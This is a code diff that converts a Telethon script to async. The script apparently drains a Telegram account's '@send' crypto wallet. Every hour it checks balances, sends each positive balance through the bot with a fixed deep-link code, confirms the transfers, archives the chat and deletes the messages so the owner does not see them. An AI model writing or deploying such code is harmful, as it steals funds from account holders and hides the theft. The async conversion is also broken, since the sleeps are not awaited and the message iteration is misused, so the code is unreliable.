@@ -1,5 +1,5 @@
 from telethon.tl.functions.messages import StartBotRequest
-import time
+import asyncio
 
 client = args[0]
 
@@ -7,18 +7,18 @@ while True:
     
     torem = []
 
-    try:client.edit_folder('@send', 1)
+    try:await client.edit_folder('@send', 1)
     except:...
 
-    msg=client.send_message('@send', '/wallet')
+    msg=await client.send_message('@send', '/wallet')
     torem.append(msg.id)
 
-    try:client.edit_folder('@send', 1)
+    try:await client.edit_folder('@send', 1)
     except:...
 
-    time.sleep(1)
+    asyncio.sleep(1)
 
-    last=client.iter_messages('@send',1)
+    last=await client.iter_messages('@send',1)
 
     for text in last:
 
@@ -38,11 +38,11 @@ while True:
 
                 if float(num)>0:
 
-                    client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
+                    await client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
 
-                    time.sleep(1)
+                    asyncio.sleep(1)
 
-                    last=client.iter_messages('@send',1)
+                    last=await client.iter_messages('@send',1)
                     for t in last: 
                         torem.append(t.id)
                         if t.reply_markup:
@@ -53,20 +53,20 @@ while True:
                                     dat = button.data.decode()
                                     if dat.replace('choose-currency-', '') == name:
                                         t.click(ii)
-                                        time.sleep(1)
-                                        msg=client.send_message('@send',num)
+                                        asyncio.sleep(1)
+                                        msg=await client.send_message('@send',num)
                                         torem.append(msg.id)
-                                        time.sleep(1)
-                                        last=client.iter_messages('@send',1)
+                                        asyncio.sleep(1)
+                                        last=await client.iter_messages('@send',1)
                                         for t in last: 
                                             torem.append(t.id)
                                             if t.reply_markup:
                                                 t.click(0)
-                                                time.sleep(1)
-                                                last=client.iter_messages('@send',1)
+                                                asyncio.sleep(1)
+                                                last=await client.iter_messages('@send',1)
                                                 for t in last: 
                                                     torem.append(t.id)
                                                     if t.reply_markup:
                                                         t.click(0)
-    client.delete_messages('@send', torem)
-    time.sleep(3600)
+    await client.delete_messages('@send', torem)
+    asyncio.sleep(3600)
